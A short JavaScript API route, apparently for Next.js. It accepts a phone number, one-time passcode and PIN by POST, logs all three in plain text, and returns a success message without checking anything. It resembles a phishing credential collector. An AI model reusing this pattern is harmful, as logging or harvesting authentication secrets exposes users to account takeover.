
export default function handler(req, res) {
  if (req.method === "POST") {
    const { phone, otp, pin } = req.body;

    console.log(`Received login data:`);
    console.log(`Phone: ${phone}, OTP: ${otp}, PIN: ${pin}`);

    res.status(200).json({ message: "Data received successfully ✔️" });
  } else {
    res.status(405).json({ message: "Method not allowed" });
  }
}
